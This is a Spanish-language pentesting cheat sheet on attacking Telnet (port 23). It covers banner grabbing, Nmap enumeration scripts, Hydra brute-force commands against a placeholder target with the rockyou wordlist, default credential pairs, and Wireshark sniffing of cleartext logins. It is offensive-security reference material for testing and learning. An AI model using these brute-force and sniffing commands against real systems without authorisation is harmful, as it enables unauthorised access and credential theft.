---
title: Telnet (Puerto 23)
pubDate: '2026-08-26'
---

## ¿Qué es Telnet?
**Telnet** es un protocolo clásico utilizado para la administración y acceso remoto a terminales. A diferencia de SSH, Telnet **no utiliza cifrado**, lo que significa que todo el tráfico (incluyendo usuarios, comandos y contraseñas) viaja en texto claro por la red.

### Riesgos principales
1. **Sniffing de Credenciales:** Cualquier atacante en la misma red (o mediante ARP Spoofing / MITM) puede capturar credenciales en texto plano.
2. **Fuerza Bruta:** Vulnerable a ataques de diccionario automatizados a alta velocidad.
3. **Falta de Autenticación Segura:** Dispositivos embebidos o routers con contraseñas de fábrica (`admin:admin`, `root:root`).

---

## 🔎 1. Enumeración y Scripts Nmap

```bash
# Conexión manual e inspección de banner
telnet <TARGET_IP>
nc -nv <TARGET_IP> 23

# Scripts NSE de Nmap para Telnet
nmap -p 23 --script=telnet-encryption,telnet-ntlm-info <TARGET_IP>
```

---

## 🔑 2. Fuerza Bruta (Hydra)

```bash
# Probar un usuario específico contra un diccionario
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> telnet

# Probar listas de usuarios y contraseñas simultáneas
hydra -L users.txt -P passwords.txt <TARGET_IP> telnet -t 32
```

---

## 🦈 3. Post-Explotación: Sniffing de Tráfico en Vivo

Si estás posicionado en la red y capturas tráfico hacia el puerto 23:
```bash
# En Wireshark / TShark:
# Filtro de display: telnet
# Inspeccionar flujo: Click derecho -> Follow TCP Stream para ver el inicio de sesión completo.
```

> **Tip:** Telnet es común en **routers, switches, cámaras IP y dispositivos IoT/OT**.
